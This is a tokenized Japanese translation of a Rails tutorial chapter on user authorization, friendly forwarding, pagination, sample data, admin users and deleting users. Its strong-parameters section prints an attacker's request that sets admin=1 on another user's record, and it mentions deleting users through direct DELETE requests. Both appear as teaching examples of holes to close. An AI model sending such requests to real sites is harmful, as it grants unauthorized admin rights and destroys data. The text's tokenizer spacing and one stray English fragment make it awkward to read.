▁ユーザー 用の fixture ファイルに 2 人 目 のユーザー を追加し てみましょう ▁( リスト \ ref { code : fixture _ sec on d _ user })。
▁ fixture ファイルに 2 人 目 のユーザー を追加する
▁次に 、 ▁リスト \ ref { code : test _ helper _ log _ in } で定義した \ ko de { log \_ in \_ as } メソッドを使って 、\ ko de { edit } アクション と \ ko de { update } アクション をテストします ▁( リスト \ ref { code : edit _ update _ w r on g _ user _ tests })。
▁このとき 、 既に ログイン 済み の ユーザーを 対象 と している ため 、 ログイン ページ ではなく ルート URL に リダイレクト している 点に注意 してください 。
▁ 間 違 った ユーザーが 編集 し よう と した とき のテスト
▁ 別の ユーザーの プロフィール を 編集 し よう と した ら リダイレクト させ たい ので 、\ ko de { correct \_ user } という メソッド を作成し 、 before フィルター から このメソッド を呼び出す ようにします ▁( リスト \ ref { code : correct _ user _ before _ filter })。
▁ before フィルター の \ ko de { correct \_ user } で \ ko de {@ user } 変数 を定義し ている ため 、 リスト \ ref { code : correct _ user _ before _ filter } では \ ko de { edit } と \ ko de { update } の 各 アクション から 、\ ko de {@ user } への 代入 文 を削除し ている 点 にも 注意 してください 。
▁ before フィルター ▁(\ ko de { correct _ user }) ▁ を使って 編集 と 更新 を 保 護 する
▁今度は テストスイート が ▁\ passing ▁ するはずです 。
▁このメソッド を使うと 今 まで の
▁ といった 部分 が 、 次のように ▁( 少し ) ▁ 分 か り やすい コード になります 。
▁ The ▁\ ko de { current \_ user ?}
▁ 先ほど の メソッドを使って 比 較 演 算 して いた 行 を 置き換え ると 、 リスト \ ref { code : correct _ user _ before _ filter _ boolean } になります 。
▁ 最終的な \ ko de { correct \_ user } の実装
▁ ここ まで で Web サイトの 認 可 機能 は 完成 した か のように 見え ます が 、 後 1 つ 小さな キ ズ があります 。 保 護 された ページ にアクセス し よう と すると 、 問 答 無 用 で 自分の プロファイル ページに 移動 させ られ てしまいます 。
▁ 別の 言 い 方 を すれば 、 ログイン していない ユーザーが 編集 ページ にアクセス し よう として いた なら 、 ユーザーが ログイン した 後に は その 編集 ページに リダイレクト される ように する の が 望 ま しい 動作 です 。
▁ リダイレクト 先 は 、 ユーザーが 開 こう として いた ページに して あ げ る の が 親 切 という ものです 。
▁ 実際の コードは 少し 複 雑 ですが 、 フ レ ンド リ ー フ ォ ワ ー デ ィ ング のテスト は 非常に シ ン プ ル に 書く ことができます 。 ログイン した 後に 編集 ページ への アクセス する 、 という 順序 を 逆 に して あ げ る だけです ▁( リスト \ ref { code : edit _ tests _ logged _ in })。
▁リスト \ ref { code : friend ly _ forwarding _ test } が 示す ように 、 実際の テストは まず 編集 ページ にアクセス し 、 ログイン した 後に 、 ( デフォルトの プロフィール ページ ではなく ) ▁\ emph { 編集 } ページに リダイレクト されている かどうか をチェックする といった テスト です 。
▁( なお 、 リダイレクト によって edit 用の テンプレート が 描画 され なく な った ので 、 リスト \ ref { code : friend ly _ forwarding _ test } では 該当する テストを 削除 しています )
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング のテスト
▁ 失敗する テストが 書 け たので 、 よう や く フ リ ンド リ ー フ ォ ワ ー デ ィ ング を実装する 準備 が できました
▁この セクション のコード では 、\ href { http :// github . com / thoughtbot / clear an ce } { thoughtbot } 社 が提供する \ href { http :// thoughtbot . com /}{ C le ar an ce } ▁gem を 適 用 しています 。
▁ ユーザーを 希 望 の ページに 転 送 するには 、 リクエスト 時点 の ページを ど こ か に保存 しておき 、 その 場所 に リダイレクト させる 必要があります 。
▁この 動作 を \ ko de { store \_ location } と \ ko de { redirect \_ b ack \_ or } の 2 つの メソッドを使用して 実現 してみましょう 。 なお 、 これらの メソッドは Sessions ヘルパー で 定義 しています ▁( リスト \ ref { code : friend ly _ forwarding _ code })。
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング の実装
▁# ▁ 記 憶 した URL ▁( も しく は デフォルト値 ) ▁ に リダイレクト
▁ 転 送 先 の URL を保存する 仕組み は 、\ ref { sec : a _ working _ log _ in _ method } で ユーザーを ログイン させ たとき と同じ で 、\ ko de { session } 変数 を使います 。
▁また 、 リクエスト 先 の URL を 取得 するために 、 リスト \ ref { code : friend ly _ forwarding _ code } では \ ko de { request } オブジェクト も 使 っています ▁(\ ko de { request . url } で リクエスト 先 が 取得 できます )。
▁リスト \ ref { code : friend ly _ forwarding _ code } の \ ko de { store \_ location } メソッド では 、 ▁ リクエスト が 送 られ た URL を \ ko de { session } 変数 の \ ko de { : forwarding \_ url } キー に 格 納 しています 。 ただし 、\ ko de { GET } リクエスト が 送 られ たとき だけ 格 納 する ように しておきます 。
▁これ によって 、 たとえば ログイン していない ユーザーが フォーム を使って 送信 した 場合 、 転 送 先 の URL を 保存 させ ないように できます 。 これは 稀 な ケース ですが 起 こ り 得 ます 。 たとえば ユーザ が セッション 用の cookie を 手動で 削除 して フォーム から 送信 する ケース など です 。
▁ こういった ケース に 対 処 して お か ない と 、\ ko de { POST } や ▁\ ko de { PATCH }、\ ko de { DELETE } リクエストを 期 待 している URL に対して 、 ( リダイレクト を通して ) ▁\ ko de { GET } リクエスト が 送 られ てしまい 、 場合によっては エラーが発生し ます 。
▁ このため 、\ ko de { if ▁ request . get ?} という 条件 文 を使って この ケース の 対策 しています
▁ Y o e l ▁A d l er の 指 摘 によって 、 この問題 と 解決 策 が 見つか り ました 。 感 謝 いた します 。
▁self を省略した 結果を リスト \ ref { code : add _ store _ location } に示します 。
▁ ログイン ユーザー 用 before フィルター に \ ko de { store \_ location } を追加する
▁ フ ォ ワ ー デ ィ ング 自体 を実装する には 、\ ko de { redirect \_ b ack \_ or } メソッド を使用します 。 リクエスト された URL が存在する 場合は そこ に リダイレクト し 、 ない場合は 何らかの デフォルトの URL に リダイレクト します 。 デフォルトの URL は 、 Session コントローラの \ ko de { create } アクション に追加 し 、 サインイン 成功 後に リダイレクト します ▁( リスト \ ref { code : friend ly _ session _ create })。
▁\ ko de { redirect \_ b ack \_ or } メソッド では 、 次のように or 演算子 \ ko de { | | } を使用します 。
▁( このコード のテスト は \ ref { sec : updating _ de let ing _ exercises } の 演習 とします )。
▁ ちなみに 、 最初に redirect 文 を実行して も 、 セッション が 削除 される 点 を 覚 え ておく と よいでしょう 。 実は 、 明示的に \ ko de { return } 文 や メソッド 内の 最 終 行 が 呼び出され ない 限 り 、 リダイレクト は 発生 しません 。 したがって 、 redirect 文 の 後 にある コード でも 、 その コードは 実行される のです 。
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング を 備 え た \ ko de { create } アクション
▁これで 、 リスト \ ref { code : friend ly _ forwarding _ test } の フ レ ンド リ ー フ ォ ワ ー デ ィ ング 用 統合テスト は パス するはずです 。 成功 すれば 、 基本 ユーザー 認 証 機能 と ページ 保 護 機能 の実装 は 完了 です 。
▁ いつものように 、 以下 を実行して テストスイート が ▁\ passing \ ▁ になる ことを確認 して から 先に 進 みましょう 。
▁この節では 、 いよいよ \ href { http :// www . an s w er s . com / p en ulti ma te } { 最 後 から 2 番目の } ユーザー アクション である \ ko de { index } アクション を追加しましょう 。 この アクション は 、\ emph { すべての } ユーザーを 一覧 表示 します 。
▁その 際 、 データベースに サンプルデータ を追加する 方法 や 、 将来 ユーザー 数 が 膨 大 になって も index ページを 問題 なく 表示 できるように するための ユーザー 出力 の \ emph { ページ ネ ート ▁( paginate = ページ 分割 ) } ▁ の 方法 を 学 び ます 。
▁ユーザーの 一覧 、 ページネーション 用 リンク 、 移動 用の ▁[ Users ] ▁ リンク のモックアップ を 図 \ ref { fig : user _ index _ mockup } に示します
▁ ユーザー一覧ページ のモックアップ
▁\ label { fig : user _ index _ mockup } }< n >\ end { figure }< n >< n >< n > ▁\ subsection { ユーザー インデックス } ▁% ▁( fold )< n > ▁\ label { sec : users _ index }< n >< n >
▁ユーザーの 一覧 ページ を実装する ために 、 まず は セキュリティ モデル について 考えてみましょう 。
▁ユーザーの \ ko de { show } ページ については 、 今後 も ▁( ログイン している かどうか に 関 わ らず ) ▁ サイト を 訪 れ た すべての ユーザー から 見え るように しておきます が 、 ユーザーの \ ko de { index } ページ は ログイン した ユーザーに しか 見 せ ないように し 、 未 登録 の ユーザーが デフォルトで 表示 できる ページを 制限 します
▁ ちなみに これは Twitter の 認 可 モデルと 同じです 。
▁\ ko de { index } ページを 不 正 な アクセス から 守 るために 、 まず は \ ko de { index } アクション が正しく リダイレクト するか 検証 する テストを 書い て み ます ▁( リスト \ ref { code : index _ action _ redirect ed _ test })。
▁\ ko de { index } アクション の リダイレクト をテストする
▁次に 、 before フィルター の \ ko de { logged \_ in \_ user } に \ ko de { index } アクション を追加して 、 この アクション を 保 護 します ▁( リスト \ ref { code : logged _ in _ user _ index })。
▁\ ko de { index } アクション には ログイン を 要求 する
▁今度は すべての ユーザー を表示する ために 、 全 ユーザーが 格 納 された 変数 を作成し 、 順 々 に 表示する index ビュー を 実装します 。
▁ To y アプリケーションに も 同じ index アクション が あった ことを思い出してください ▁( リスト \ ref { code : demo _ index _ action })。 その とき と同様に 、\ ko de { User . all } を使って データベース 上の 全 ユーザー を取得し 、 ビューで 使用 可能な \ ko de {@ users } という インスタンス変数 に 代入 させ ます ▁( リスト \ ref { code : user _ index })。
▁( すべての ユーザーを 一 気 に 読み 出 す と データ 量 が多い 場合に 問題が生じ る の では ない か と 思 わ れ た 方 、 その とおりです 。 この キ ズ は \ ref { sec : pagination } で 修正 します 。 )
▁ユーザーの \ ko de { index } アクション
▁ 実際の インデックス ページ を作成する には 、 ユーザーを 列 挙 して ユーザー ごとに \ ko de { li } タグ で 囲 む ビュー を 作成する必要があります 。
▁ここでは \ ko de { each } メソッドを使用して これ を行います 。 それぞれの 行 を リスト タグ \ ko de { ul } で 囲 い ながら 、 各 ユーザーの Gravatar と 名前 を表示します ▁( リスト \ ref { code : user _ index _ view })。
▁ユーザーの index ビュー
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option } の 演習 の リスト \ ref { sec : signup _ exercises } の 結果を 利用 しています 。 これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁この 演習 を まだ や って い ない場合は 、 リスト \ ref { code : gravatar _ option } に従って Users ヘルパー ファイルを 更新 して から 先に 進 んで ください 。
▁ CSS ▁( 正 確 には S CSS ですが ) ▁ にも ち ょ っ ぴ り 手 を加え て お き ましょう ▁( リスト \ ref { code : user _ index _ css })。
▁ユーザーの index ページ 用の CSS
▁最後に 、 サイト 内 移動 用の ヘッダー に ユーザー 一覧 表示 用の リンク を追加します 。 これ には \ ko de { users \_ path } を使用し 、 表 \ ref { table : RESTful _ users } に 残 っている 最後の 名前付きルート を 割り当て ます 。
▁作成した コードをリスト \ ref { code : users _ link } に示します
▁ ユーザー一覧ページ へのリンク を更新する
▁これで ユーザーの インデックス は 完全に 動く ように なり 、 テスト も 全 て ▁\ passing ▁ する ようになります 。
▁ もう少し 何 と か してみましょう 。
▁ ユーザー一覧ページ に ユーザーが 1 人 しか 表示 されていない
▁この節では 、 一 人 ぼ っ ち の ユーザーに 仲 間 を加え て あ げ る ことにします 。
▁ 複数の ユーザーが 表示 された ユーザー インデックス ページに するために は 、 ブラウザで サインアップ ページを 表示 して ユーザーを 手 作業 で 1 人 ず つ 追加 する という 方法 も \ emph { あります が } 、 せ っ か く なので Ruby と Rake を使用して ユーザーを 一 気 に 作成 しましょう 。
▁次に 、 いつものように 以下 を実行します 。
▁ では 、 サンプル ユーザー を生成する Rake タスク を追加し てみましょう 。 Rails では \ ko de { db / s e ed s . rb } という ファイルを 標準 として 使い ます 。
▁作成した コードをリスト \ ref { code : db _ s e ed } に示します
▁( リスト \ ref { code : db _ s e ed } のコードは 少し 応 用 的 です 。 詳 細 が 完全に 理解 でき なくても 問題 ありません )
▁ データベース 上 に サンプル ユーザー を生成する Rake タスク
▁リスト \ ref { code : db _ s e ed } のコード では 、 E x am p le ▁User という 名前 と メールアドレス を持つ 1 人 の ユーザ と 、 それら しい 名前 と メールアドレス を持つ 99 人のユーザー を作成します 。
▁\ ko de { create ! } は 基本的に \ ko de { create } メソッド と同じ ものです が 、 ユーザーが 無効な 場合に \ ko de { false } を返す の ではなく 例外を発生 させる ▁(\ ref { sec : find ing _ user _ objects }) ▁ 点が 異なります 。
▁ こう しておく と 見 過 ご し やすい エラー を 回 避 できる ので 、 デバッグ が 容易に なります 。
▁それでは 、 データベース を リセット して 、 リスト \ ref { code : db _ s e ed } の Rake タスク を 実行 ▁(\ ko de { db : s e ed }) ▁ してみましょう
▁ 原 理 的に は 、\ ko de { rake ▁ db : reset } コマンド 1 つ で これら 2 つの タスク を実行する ことが も できます が 、 最新の Rails だと うまく 動か ないので この ようにしています 。
▁ データベース 上 に データ を追加する のは 遅 く なり が ち で 、 システム によって は 数 分 か か ること も あり 得 ます 。
▁\ ko de { db : s e ed } で Rake タスク を実行し 終 わ ると 、 サンプルアプリケーションの ユーザーが 100 人 になっています 。
▁ 図 \ ref { fig : user _ index _ all } が 示す ように 、 ▁ 最初の いくつかの メールアドレス については 、 デフォルトの Gravatar 画像 以外の 写 真 を 関連付け て み ました 。
▁( システム 環境 によって は 、 ここで Rails を 再 起動 させる 必要がある かもしれません 。 )
▁ ユーザー一覧ページ に 100 人 の サンプル ユーザー が表示されている
▁これで 、 最初の ユーザーに も 仲 間 が できました 。 しかし 今度は 逆 に 、 1 つの ページに \ emph { 大 量 の } ユーザー が表示され て し ま っています 。
▁ 100 人 でも かなり 大 き い 数 である と思います し 、 今後 は 数 千 ユーザーに 増え る 可能性 もあります 。
▁ これを 解決 する の が \ emph { ページネーション ▁( pagination ) ▁ } という もの で 、 この場合は 、 たとえば 1 つの ページに 一度 に 30 人 だけ ユーザー を表示する という ものです 。
▁Rails には 豊 富 な ページネーション メソッド があります 。 今回は そ の中で 最も シ ン プ ル かつ 堅牢 な \ href { http :// wiki . github . com / m is la v / will _ paginate /}{ will _ paginate } メソッドを使用して みましょう 。
▁ これはリスト \ ref { code : will _ paginate _ gem } で使用されていま した 。
▁次に \ ko de { bundle ▁install } を実行します 。
▁ 新しい gem が正しく 読み込まれ るように 、 Web サーバーを再起動 してください 。
▁ ページネーション が 動作する には 、 ユーザーの ページネーション を行う ように Rails に 指示 する コードを index ビュー に 追加する必要があります 。 また 、\ ko de { index } アクション にある \ ko de { User . all } を 、 ページネーション を 理解 できる オブジェクト に置き換え る 必要 もあります 。
▁まずは 、 ビュー に 特殊な \ ko de { will \_ paginate } メソッド を追加しましょう ▁( リスト \ ref { code : will _ paginate _ index _ view })。 同じ コードが リスト の 上 と 下 に 2 つ あります が 、 その 理由 は この後 で説明します 。
▁ ユーザー一覧ページ で pagination を使う
▁この \ ko de { will \_ paginate } メソッドは 少々 不 思 議 な ことに 、\ ko de { users } ビュー のコード の中から \ ko de {@ users } オブジェクトを 自動的に 見つけ 出 し 、 それ から 他の ページ にアクセス するための ページネーション リンク を作成 しています 。
▁ただし 、 リスト \ ref { code : will _ paginate _ index _ view } の ビュー は このままでは 動 き ません 。 という の も 、 現在の \ ko de {@ users } 変数 には \ ko de { User . all } の 結果 が 含まれています が ▁( リスト \ ref { code : user _ index }) 、\ ko de { will \_ paginate } では \ ko de { paginate } メソッド を使った 結果 が 必要 だ からです 。 必要となる データ の例 は 次の とおりです 。
▁\ ko de { paginate } では 、 キー が \ ko de { : page } で 値が ページ 番号 の ハッシュ を 引数に 取り ます 。
▁従って 、 1 ページ 目 は 1 から 30 のユーザー 、 2 ページ 目 は 3 1 から 6 0 のユーザー といった 具 合 に データ が 取り 出 されます 。 ちなみに \ ko de { page } が \ ko de { nil } の場合 、 ▁\ ko de { paginate } は 単 に 最初の ページ を返します 。
▁\ ko de { paginate } を使用することで 、 サンプルアプリケーションの ユーザーの ページネーション を 行える ようになります 。 具体的には 、\ ko de { index } アクション 内の \ ko de { all } を \ ko de { paginate } メソッド に置き換え ます ▁( リスト \ ref { code : will _ paginate _ index _ action })。
▁ここで \ ko de { : page } パラメータ ー には \ ko de { params [: page ]} が 使用 されています が 、 これは \ ko de { will \_ paginate } によって自動的に 生成されます 。
▁\ ko de { index } アクション で Users を ページ ネ ート する
▁以上で 、 ユーザー一覧ページ は 図 \ ref { fig : user _ index _ pagination } のように 動作 するはずです
▁( システム 環境 によって は 、 ここで Rails を 再 起動 する 必要がある かもしれません )。
▁\ ko de { will \_ paginate } を ユーザー リスト の 上 と 下 の 両方 に 配置 して あるので 、 ページネーション の リンク も ページの 上 と 下 の 両方 に 表示 されています 。
▁ ページネーション された ユーザー一覧ページ
▁[ \ href { http :// localhost :3000/ users ? page = 2 } {2} ] ▁ リンク または ▁[ \ href { http :// localhost :3000/ users ? page = 2 } { N ext } ] ▁ リンクをクリックすると 、 図 \ ref { fig : user _ index _ page _ two _ rails _ 3 } のように 次の ページ に移動し ます 。
▁ユーザー 一覧 の 2 ページ 目
▁これで ユーザー一覧ページ が 動く ようになった ので 、\ ref { sec : pagination } の ページネーション に対する 簡単な テスト も 書い て お き ましょう 。
▁ 今回の テストでは 、 ログイン 、 index ページ にアクセス 、 最初の ページに ユーザーが いる ことを確認 、 ページネーション の リンク がある ことを確認 、 といった 順 で テスト していきます 。
▁ 最後の 2 つの ステップ では 、 テスト 用の データベースに 3 1 人 以上 の ユーザーが い る必要があります 。
▁リスト \ ref { code : fixture _ sec on d _ user } で 2 人 目 の ユーザーを fixture に追加 しました が 、 今回は もっと 多くの ユーザーを 作成する必要があります 。 手動で 追加 する のは 面倒 そう です ね 。
▁ 幸 運 には 、 ユーザー 用 fixture ファイルの \ ko de { password \_ digest } 属性 で 使 った ように 、 fixture では 埋め込み Ruby を サポート しています 。 これを 利用 して さらに 30 人のユーザー を追加し てみましょう ▁( リスト \ ref { code : users _ fixtures _ ext r a _ users })。
▁なお 、 今後 必要 になる ので 、 リスト \ ref { code : users _ fixtures _ ext r a _ users } では 2 人 の 名前付き ユーザー も 一 緒 に追加 しています 。
▁ fixture に さらに 30 人のユーザー を追加する
▁リスト \ ref { code : users _ fixtures _ ext r a _ users } の fixture ファイルが できた ので 、 index ページ に対するテスト を 書い て み ます 。
▁まずは 、 いつものように 統合テスト を生成します 。
▁ 今回の テストでは 、\ ko de { pagination } クラス を 持 った \ ko de { div } タグ を チェック して 、 最初の ページに ユーザーが いる ことを確認します 。
▁作成した コードをリスト \ ref { code : user _ index _ test } に示します
▁ ページネーション を含め た Users インデックス のテスト
▁この テストは ▁\ passing \ ▁ するはずです 。
▁ ユーザー一覧ページ に ページネーション を実装する ことができ ましたが 、 私 は ここで 1 つの 改良 を加え て み たい のです 。 実は Rails には コ ン パ ク ト な ビュー を作成する ための 素晴らしい ツール が い く つ もあります 。 この節 では それらの ツール を使用して 一覧 ページの リファクタリング ▁( 動作 を 変え ずに コードを 整 理 すること ) ▁ を行う ことにします 。
▁ サンプルアプリケーションの テストは 既に 完了 している ので 、 Web サイトの 機能を 損 な う こと なく 安 心 して リファクタリング に 取り か か れ ます 。
▁ リファクタリング の 第 一 歩 は 、 リスト \ ref { code : index _ view _ first _ refactoring } の ユーザーの \ ko de { li } を \ ko de { render } 呼び出し に置き換え ること です ▁( リスト \ ref { code : index _ view _ first _ refactoring })。
▁ index ビュー に対する 最初の リファクタリング
▁この \ ko de { user } という 名前 そのもの は まったく 重要 では ない ことに注意してください 。 たとえば user を foo bar に置き換え 、\ ko de {@ users . each ▁do ▁| foo bar | } と 書い て から \ ko de { render ▁ foo bar } と 呼び出し ても 問題 なく 動作します 。
▁ 重要な のは 、 そのオブジェクト そのもの ではなく 、 そのオブジェクト が 属 している \ emph { クラス } ▁( この場合は \ ko de { User } クラス ) ▁ の 方 です 。
▁ 各 ユーザー を表示する パーシャル
▁これは 間 違 い なく 大きな 進 歩 です 。 しかし ここで 終 わ ら せ ず 、 さらに 改良 してみましょう 。 今度は \ ko de { render } を \ ko de {@ users } 変数 に対して \ emph { 直接 } 実行 します ▁(\ ref { code : index _ f in al _ refactoring })。
▁ ユーザー一覧ページ の 完全な リファクタリング
▁これにより 、 リスト \ ref { code : index _ f in al _ refactoring } のコードは 極めて コ ン パ ク ト になります 。
▁これ に 限 らず 、 リファクタリング を行う 場合には 、 アプリケーションの コード を変更する 前 と 後 で 必ず テスト を実行し 、 いずれ も ▁\ passing \ ▁ になる ことを確認 するようにしてください 。
▁ユーザーの 一覧 ページ は つ い に 完了 しました 。 残 る は \ ko de { destroy } だけです 。 これ を実装する ことで 、 REST に 準 拠 した 正 統 な アプリケーション となります 。
▁この節では 、 ユーザーを削除 するための リンク を追加します 。 モックアップ を 図 \ ref { fig : user _ index _ delete _ links _ mockup } に示します 。 また 、 削除 を行う の に 必要な \ ko de { destroy } アクション も 実装します 。
▁しかし その 前に 、 削除 を 実行 できる 権限 を持つ \ emph { 管理 ▁( admin ) ▁ } ユーザーの クラス を作成し ましょう 。
▁ 削除リンク を追加した ユーザー 一覧 のモックアップ
▁\ label { fig : user _ index _ delete _ links _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { 管理 ユーザー } ▁% ▁( fold )< n > ▁\ label { sec : admin ist r at ive _ users }< n >< n >
▁ 特 権 を持つ 管理 ユーザーを 識 別 するために 、 論理値 を と る \ ko de { admin } 属性を User モデル に追加します 。 この後 で説明します が 、 こう すると 自動的に \ ko de { admin ?} メソッド ▁( 論理値 を返す ) ▁ も 使えるようになります ので 、 これ を使用して 管理 ユーザーの 状態 を テスト できます 。
▁ 変更 後 の データモデル は 図 \ ref { fig : user _ model _ admin } のようになります 。
▁ 論理値 を と る \ ko de { admin } 属性 が追加され た User モデル
▁ マイグレーション を実行すると \ ko de { admin } カラム が \ ko de { users } テーブル ▁( リスト \ ref { code : admin _ migration }) ▁ に追加 されます 。
▁リスト \ ref { code : admin _ migration } では 、\ ko de { default : ▁false } という 引数 を \ ko de { add \_ column } に追加 しています 。 これは 、 デフォルトで は 管理者 に \ emph { な れ ない } ということ を 示す ためです
▁(\ ko de { default : ▁false } 引数 を 与え ない場合 、 ▁\ ko de { admin } の値 はデフォルトで \ ko de { nil } になります が 、 これは \ ko de { false } と同じ 意味 です ので 、 必ず し も この 引数 を与える 必要はありません 。
▁ただし 、 この ように 明示的に 引数 を与えて お け ば 、 コードの 意 図 を Rails と 開発者 に 明 確 に 示す ことができます )。
▁ boolean 型 の \ ko de { admin } 属性を User に追加する マイグレーション
▁ 後 は いつものように マイグレーション を実行します 。
▁Rails ▁console で 動作 を確認する と 、 期待どおり \ ko de { admin } 属性 が追加され て 論理値 を と り 、 さらに 疑問符 の 付 いた \ ko de { admin ?} メソッド も 利用できる ようになっています 。
▁ここでは \ ko de { to g g le ! } メソッドを使用して ▁\ ko de { admin } 属性 の 状態 を \ ko de { false } から \ ko de { true } に 反 転 しています 。
▁ 仕 上 げ に 、 最初の ユーザー だけ を デフォルトで 管理者 にする よう サンプルデータ を更新し ましょう ▁( リスト \ ref { code : p o p ul at or _ with _ admin })。
▁ サンプルデータ 生成 タスク に 管理者 を 1 人 追加 する
▁次に 、 データベース を リセット して 、 サンプルデータ を 再度 生成 します 。
▁S trong ▁Parameters 、 再 び
▁リスト \ ref { code : p o p ul at or _ with _ admin } では 、 初期化 ハッシュ に \ ko de { admin : ▁true } を設定する ことで ユーザーを 管理者 に している ことに お 気 付き に なりました でしょう か 。
▁ここでは 、 荒 れ 狂 う Web 世界 に オブジェクトを さ ら す こと の 危 険 性 を 改 め て 強 調 しています 。 も し 、 任意の Web リクエスト の 初期化 ハッシュ を オブジェクト に 渡 せる となる と 、 攻撃者 は 以下のような \ text tt { PATCH } リクエストを 送信 して く る かもしれません
▁\ text tt { c url } などの コマンドライン ツール を使用すると 、\ text tt { PATCH } リクエストを この 形式 で 送信 することができます 。
▁ patch ▁ / users / 17 ?
▁ admin = 1
▁この リクエスト は 、 17 番目の ユーザーを 管理者 に 変え てしまいます 。 ユーザーの この 行 為 は 、 少なくとも 重 大 な セキュリティ 違 反 となる 可能性があります し 、 実際には それ だけで は 済 ま ない でしょう 。
▁ このような 危 険 がある から こ そ 、 編集 しても よい 安全 な 属性 だけ を更新する ことが 重要 になります 。
▁\ ref { sec : strong _ parameters } で説明した とおり 、\ emph { S trong ▁Parameters } を使用して これ を行います 。 具体的には 、 ▁ 以下のように \ ko de { params } ハッシュ に対して \ ko de { require } と \ ko de { per m it } を呼び出します 。
▁上のコードでは 、 許可 された 属性 リスト に \ ko de { admin } が含まれ て \ emph { い ない } ことに注目してください 。
▁これにより 、 任意の ユーザーが 自分自身 に アプリケーションの 管理者 権限 を与える ことを 防止 できます 。
▁ この問題 は 重 大 である ため 、 編集 可能 になって は な らない 属性 に対するテスト を作成する ことを ぜ ひ とも お勧め します 。 \ ko de { admin } 属性 のテスト については 演習 に 回 します ▁(\ ref { sec : updating _ de let ing _ exercises })。
▁ Users リソース の 最後の 仕 上 げ として 、\ ko de { destroy } アクション へのリンク を追加しましょう 。
▁ まず 、 ユーザー インデックス ページの 各 ユーザーに 削除 用の リンク を追加し 、 続いて 管理 ユーザー への アクセス を 制限 します 。
▁これ によって 、 現在のユーザー が 管理者 の ときに 限 り ▁\ ko de { [ delete ]} ▁ リンク が表示される ようになります ▁( リスト \ ref { code : delete _ links })。
▁ユーザー 削除 用 リンク の実装 ▁( 管理者 に のみ 表示される )
▁ここで 、 必要な \ ko de { DELETE } リクエストを 発行する リンク の 生成 は \ text tt { method : ▁: delete } 引数 によって 行われている 点 に 注目してください 。 ▁ ar g um ent , ▁ w h i ch ▁ ar range s ▁for ▁the ▁ link ▁to ▁ issue ▁the ▁ n ec ess ary ▁\ ko de { DELETE } ▁ request . ▁We ’ ve ▁ al s o ▁ w r app ed ▁ each ▁ link ▁in s id e ▁ an ▁\ text tt { if } ▁ state m ent ▁ s o ▁that ▁ only ▁ admin s ▁c an ▁ s e e ▁the m .
▁ 管理者 から 見え る ページを 図 \ ref { fig : index _ delete _ links _ rails _ 3 } に示します 。
▁ ブラウザ は ネ イ テ ィ ブ では \ text tt { DELETE } リクエストを 送信 できない ため 、 Rails では JavaScript を使用して これを 偽 造 します 。
▁つまり 、 JavaScript が オフ になっている と ユーザー 削除 の リンク も 無効 になる ということです 。
▁ JavaScript を サポート しない ブラウザ を サポート する 必要がある 場合は 、 フォーム と \ text tt { POST } リクエスト を使用して \ text tt { DELETE } リクエストを 偽 造 することもできます 。 こ ち ら は JavaScript が なくても 動作します
▁ 詳 しく は RailsCast の ▁“ \ href { http :// rails casts . com / e p is odes / 7 7 - destroy - with out - javascript } { JavaScript を 使 わ ない 削除 } ” ▁( 英語 ) ▁ を 観 てください 。
▁ ユーザー一覧ページ に 削除 用 リンク が表示される
▁この 削除リンク が 動作する ためには 、\ ko de { destroy } アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ を 追加する必要があります 。 この アクション では 、 該当する ユーザー を見つけ て Active ▁Record の \ ko de { destroy } メソッドを使用して 削除 し 、 最後に ユーザー インデックス に移動し ます ▁( リスト \ ref { code : destroy _ action })。
▁ ユーザーを削除 するために は ログイン して い なく て は なら ないので 、 リスト \ ref { code : destroy _ action } では \ ko de { : destroy } アクション も \ ko de { logged \_ in \_ user } フィルター に追加 しています 。
▁ 実際に 動作する \ ko de { destroy } アクション を追加する
▁\ ko de { destroy } アクション では 、\ ko de { find } メソッドと \ ko de { destroy } メソッドを 1 行 で 書く ために 2 つの メソッドを 連 結 ▁( cha in ) ▁ して いる点に注目してください 。
▁ 結果 として 、 管理者 だけ が ユーザーを削除 できるようになります ▁( より 具体的には 、 削除リンク が 見え ている ユーザー のみ 削除 できる )。 しかし 、 実 はまだ 大きな セキュリティ ホ ー ル があります 。 ある程度 の 腕 前 を持つ 攻撃者 なら 、 コマンドライン で \ text tt { DELETE } リクエスト を直接 発行する という 方法で サイトの 全 ユーザーを削除 してしまう ことができる でしょう 。
▁ サイト を 正しく 防 衛 するには 、\ ko de { destroy } アクションに も アクセス 制 御 を行う 必要があります 。 これを 実装 して よう や く 、 管理者 \ emph { だけ が } ユーザーを削除 できるようにします 。
▁\ ref { sec : requir ing _ logged _ in _ users } と \ ref { sec : requir ing _ the _ right _ user } と同じ ように 、 今回は before フィルター を使って \ ko de { destroy } アクション への アクセス を 制 御 します 。
▁ 実装 する \ ko de { admin \_ user } フィルター を リスト \ ref { code : admin _ destroy _ before _ filter } に示します 。
▁ before フィルター で \ ko de { destroy } アクション を 管理者 だけ に 限 定 する
▁# ▁ 管理者 かどうか 確認
▁ユーザー 削除 と同じ く ら い 重要な ことは 、 その 振る舞い が 期 待 された かどうかを 確かめ る 良い テストを書く ことです 。
▁ そこで 、 まず は ユーザー 用 fixture ファイルを 修正 し 、 今 いる サンプル ユーザーの 一 人 を 管理者 に してみます ▁( リスト \ ref { code : fixture _ user _ admin })。
▁ fixture 内の 最初の ユーザーを 管理者 にする
▁\ ref { sec : requir ing _ logged _ in _ users } で 経験 し てきた ように 、 Users コントローラ をテストする ために 、 アクション 単 位 で アクセス 制 御 をテストします 。
▁リスト \ ref { code : user _ log out _ test } の ログアウト のテスト と同様に 、\ ko de { 削除 } をテストする ために 、\ text tt { DELETE } リクエストを 発 行 して \ ko de { destroy } アクション を直接 動作 させ ます 。
▁このとき 2 つの ケース を チェック します 。 1 つ は 、 ログイン していない ユーザー であれば 、 ログイン 画面 に リダイレクト される ことです 。 もう 1 つ は 、 ログイン 済み では あって も 管理者 で なければ 、 ホ ー ム 画面 に リダイレクト される ことです 。
▁作成した コードをリスト \ ref { code : action _ tests _ admin } に示します
▁ 管理者 権限 の 制 御 を アクション レベル で テスト する
